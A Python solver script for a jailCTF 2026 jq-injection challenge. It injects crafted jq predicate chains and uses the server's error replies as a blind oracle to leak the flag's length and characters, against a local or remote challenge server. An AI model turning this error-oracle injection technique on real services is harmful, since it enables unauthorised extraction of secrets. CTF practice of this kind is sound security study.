#!/usr/bin/env python3
"""
Set-based fallback solver for jailCTF 2026 "just another injection challenge".

Use this when the singleton solver dies with:
    predicate table/server math mismatch

It reuses the feature/oracle machinery from solve_checked.py (or solve.py), but
it treats every predicate chain as an accept-set instead of assuming it accepts
one exact numeric value.  That avoids false negatives when a chain is not truly
singleton on the remote jq build.

Expected files in the same directory:
  - solve_checked.py  (or solve.py)
  - singletons.json
  - server.py for local mode

Examples:
  python3 solve_set_oracle.py local --server server.py --flag 'jail{abc}' --jq jq
  python3 solve_set_oracle.py remote challs.pyjail.club 20219
"""
from __future__ import annotations

import argparse
import importlib.util
import json
import math
import sys
from dataclasses import dataclass
from pathlib import Path


def load_base(path: Path | None):
    here = Path(__file__).resolve().parent
    candidates = []
    if path is not None:
        candidates.append(path)
    candidates += [here / "solve_checked.py", here / "solve.py"]
    for cand in candidates:
        if cand.exists():
            spec = importlib.util.spec_from_file_location("base_solve", str(cand))
            if spec is None or spec.loader is None:
                continue
            mod = importlib.util.module_from_spec(spec)
            sys.modules["base_solve"] = mod
            spec.loader.exec_module(mod)  # type: ignore[union-attr]
            print(f"[+] using base solver module: {cand}")
            return mod
    raise SystemExit("[-] missing solve_checked.py or solve.py in this directory")


def predicate(ops: list[str]) -> str:
    parts: list[str] = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)


def unique_chains(chains_path: Path) -> list[list[str]]:
    raw = json.loads(chains_path.read_text())
    out: list[list[str]] = []
    seen: set[tuple[str, ...]] = set()
    for _, ops in sorted(raw.items(), key=lambda kv: int(kv[0])):
        t = tuple(ops)
        if t not in seen:
            seen.add(t)
            out.append(list(ops))
    return out


def isnormal(x: object) -> bool:
    return isinstance(x, float) and math.isfinite(x) and abs(x) >= sys.float_info.min


def apply_op_value(x: float, op: str) -> float | None:
    try:
        if op == "frexp|first":
            return float(math.frexp(x)[0])
        y = getattr(math, op)(x)
        return float(y)
    except Exception:
        return None


def chain_accepts_value(v: int, ops: list[str]) -> bool:
    x = float(v)
    for op in ops:
        nxt = apply_op_value(x, op)
        if nxt is None or not isnormal(nxt):
            return False
        x = nxt
    return True


def accept_sets(chains: list[list[str]], values) -> list[set[int]]:
    values = sorted(set(map(int, values)))
    accepts: list[set[int]] = []
    for ops in chains:
        accepts.append({v for v in values if chain_accepts_value(v, ops)})
    return accepts


@dataclass(frozen=True)
class SetObservation:
    fi: int
    reverse: bool
    accept: frozenset[int]
    nuisance_in: bool
    present: bool


def build_value_universe(base, length: int, charset: str, feature_count: int) -> set[int]:
    domains = {i: base.fixed_domain(i, length, charset) for i in range(length)}
    allvals: set[int] = set()
    for fi in range(feature_count):
        feature = base.FEATURES[fi]
        for reverse in (False, True):
            allvals.add(feature.evaluate(length - 1, None))
            for pos, chars in domains.items():
                idx = length - 1 - pos if reverse else pos
                for c in chars:
                    allvals.add(feature.evaluate(idx, c))
    return allvals


def make_set_queries(base, length: int, charset: str, feature_count: int, chains: list[list[str]], accepts: list[set[int]]):
    domains = {i: base.fixed_domain(i, length, charset) for i in range(length)}
    exprs: list[str] = []
    meta: list[tuple[int, bool, int]] = []
    for fi in range(feature_count):
        feature = base.FEATURES[fi]
        for reverse in (False, True):
            vals = {feature.evaluate(length - 1, None)}
            for pos, chars in domains.items():
                idx = length - 1 - pos if reverse else pos
                vals.update(feature.evaluate(idx, c) for c in chars)
            base_expr = base.BASE + ("|explode|reverse|implode" if reverse else "")
            for ci, ops in enumerate(chains):
                inter = vals & accepts[ci]
                if not inter or inter == vals:
                    continue
                exprs.append(
                    f"{base_expr}|explode|tostream|{feature.suffix}|{predicate(ops)}|error"
                )
                meta.append((fi, reverse, ci))
    return exprs, meta


def domains_from_obs(base, length: int, charset: str, observations: list[SetObservation]):
    domains = {i: base.fixed_domain(i, length, charset) for i in range(length)}
    for obs in observations:
        if obs.present:
            continue
        feature = base.FEATURES[obs.fi]
        for pos in range(length):
            idx = length - 1 - pos if obs.reverse else pos
            domains[pos] = [
                c for c in domains[pos] if feature.evaluate(idx, c) not in obs.accept
            ]
            if not domains[pos]:
                raise RuntimeError(
                    f"empty domain at position {pos} from feature {obs.fi} "
                    f"{feature.name}; accept-set model still mismatches server"
                )
    return domains


def constraints_from_obs(base, length: int, observations: list[SetObservation], domains):
    constraints: set[frozenset[tuple[int, int]]] = set()
    for obs in observations:
        if not obs.present or obs.nuisance_in:
            continue
        feature = base.FEATURES[obs.fi]
        opts: set[tuple[int, int]] = set()
        for pos, chars in domains.items():
            idx = length - 1 - pos if obs.reverse else pos
            for c in chars:
                if feature.evaluate(idx, c) in obs.accept:
                    opts.add((pos, c))
        if opts:
            constraints.add(frozenset(opts))
    return sorted(constraints, key=lambda item: (len(item), sorted(item)))


def solve_once(base, oracle, chains_path: Path, charset: str, minimum: int, maximum: int, feature_count: int, limit: int):
    raw = json.loads(chains_path.read_text())
    singleton_chains = {int(value): ops for value, ops in raw.items()}
    print(f"[+] loaded {len(singleton_chains)} singleton labels for length recovery")

    print("[*] recovering flag length")
    length = base.recover_length(oracle, singleton_chains, minimum, maximum)
    print(f"[+] flag length = {length}")

    chains = unique_chains(chains_path)
    print(f"[+] using {len(chains)} unique predicate chains as accept-sets")
    allvals = build_value_universe(base, length, charset, feature_count)
    accepts = accept_sets(chains, allvals)

    exprs, meta = make_set_queries(base, length, charset, feature_count, chains, accepts)
    print(f"[*] set broad phase: {feature_count} features, {len(exprs)} oracle queries")
    answers = oracle.query_batch(exprs)

    observations: list[SetObservation] = []
    for (fi, reverse, ci), ans in zip(meta, answers):
        nuisance = base.FEATURES[fi].evaluate(length - 1, None)
        observations.append(
            SetObservation(
                fi=fi,
                reverse=reverse,
                accept=frozenset(accepts[ci]),
                nuisance_in=nuisance in accepts[ci],
                present=ans == "error",
            )
        )

    domains = domains_from_obs(base, length, charset, observations)
    constraints = constraints_from_obs(base, length, observations, domains)
    print(f"[+] domain size: {sum(map(len, domains.values()))}; positive constraints: {len(constraints)}")
    for pos, chars in domains.items():
        if len(chars) > 1:
            print(f"[!] ambiguous domain at {pos}: {''.join(map(chr, chars))}")

    solutions = base.solve_constraints(length, domains, constraints, limit=limit)
    print(f"[+] solutions: {solutions}")
    if len(solutions) != 1:
        raise RuntimeError(
            "not unique; rerun with --feature-count 124, or paste the candidates/output back"
        )
    return solutions[0]


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", type=Path, default=None, help="solve_checked.py or solve.py")
    parser.add_argument("--chains", type=Path, default=Path("singletons.json"))
    parser.add_argument("--charset", default=None)
    parser.add_argument("--min-length", type=int, default=6)
    parser.add_argument("--max-length", type=int, default=128)
    parser.add_argument("--feature-count", type=int, default=84)
    parser.add_argument("--limit", type=int, default=5)
    sub = parser.add_subparsers(dest="mode", required=True)

    local = sub.add_parser("local")
    local.add_argument("--server", type=Path, default=Path("server.py"))
    local.add_argument("--flag", default="jail{abc}")
    local.add_argument("--jq", default="jq")
    local.add_argument("--timeout", type=int, default=600)

    remote = sub.add_parser("remote")
    remote.add_argument("host")
    remote.add_argument("port", type=int)
    remote.add_argument("--timeout", type=int, default=360)

    args = parser.parse_args()
    base = load_base(args.base)
    charset = args.charset or base.DEFAULT_CHARSET

    if args.mode == "local":
        oracle = base.LocalServerOracle(args.server, args.flag, args.jq, args.timeout)
    else:
        oracle = base.RemoteOracle(args.host, args.port, args.timeout)

    try:
        flag = solve_once(
            base,
            oracle,
            args.chains,
            charset,
            args.min_length,
            args.max_length,
            args.feature_count,
            args.limit,
        )
    finally:
        oracle.close()

    print(f"[+] recovered flag: {flag}")
    if args.mode == "local" and flag != args.flag:
        print(f"[-] local verification failed: expected {args.flag!r}", file=sys.stderr)
        return 1
    print("[+] verification successful")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
